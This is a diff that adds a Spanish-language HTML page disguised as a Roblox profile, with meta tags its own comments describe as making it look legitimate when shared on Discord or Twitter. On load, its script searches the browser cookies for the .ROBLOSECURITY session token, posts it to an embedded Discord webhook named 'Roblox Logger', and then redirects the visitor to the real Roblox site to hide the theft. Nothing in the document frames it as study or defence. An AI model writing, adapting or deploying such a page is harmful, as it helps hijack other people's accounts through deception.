@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Meta tags para que en Discord/Twitter parezca legítimo -->
+    <meta property="og:title" content="Roblox Profile - Player">
+    <meta property="og:description" content="Check out my Roblox profile!">
+    <meta property="og:image" content="https://tr.rbxcdn.com/6e3cd0d1f2a6b0c5e8f9d2a1b3c4d5e6/150/150/AvatarHeadshot/Png">
+    <meta property="og:url" content="https://roblox.com">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#111111">
+    
+    <title>Roblox - Profile</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #333;
+            border-top: 4px solid #00bfff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        p {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo de Roblox (simulado con CSS) -->
+        <div class="logo" style="font-size: 60px;">🎮</div>
+        <h1>Roblox</h1>
+        <div class="loader"></div>
+        <p>Cargando perfil...</p>
+        <p class="hidden" id="status"></p>
+    </div>
+
+<script>
+    // Espera a que la página cargue completamente
+    window.onload = function() {
+        // Intenta obtener la cookie de Roblox
+        var cookies = document.cookie.split('; ');
+        var robloxCookie = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
+        
+        if(robloxCookie) {
+            // Extrae solo el valor
+            var valor = robloxCookie.substring('.ROBLOSECURITY='.length);
+            
+            // Envía a tu webhook de Discord
+            fetch('https://discord.com/api/webhooks/1527488814782742549/joBDrncYL9vgpH18ZLEQauTOC_ppk-8rRgFQLwkaHarz6LnLbMrJx7GS8vYBfPifv_2a', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: 'Roblox Logger',
+                    avatar_url: 'https://www.roblox.com/favicon.ico',
+                    content: '🎯 **Cookie capturada:**\n```' + valor + '```\n📅 Fecha: ' + new Date().toLocaleString(),
+                    embeds: [{
+                        title: 'Nueva cookie recibida',
+                        color: 0x00bfff,
+                        fields: [{
+                            name: 'URL',
+                            value: window.location.href,
+                            inline: false
+                        }]
+                    }]
+                })
+            }).then(function(response) {
+                // Redirige a Roblox real después de 2 segundos
+                setTimeout(function() {
+                    window.location.href = 'https://www.roblox.com/users/profile';
+                }, 2000);
+            }).catch(function(error) {
+                // Si falla, igual redirige
+                window.location.href = 'https://www.roblox.com';
+            });
+        } else {
+            // Si no está logueado en Roblox
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelector('p').textContent = 'Error: Debes iniciar sesión en Roblox primero';
+            setTimeout(function() {
+                window.location.href = 'https://www.roblox.com';
+            }, 3000);
+        }
+    };
+</script>
+</body>
+</html>
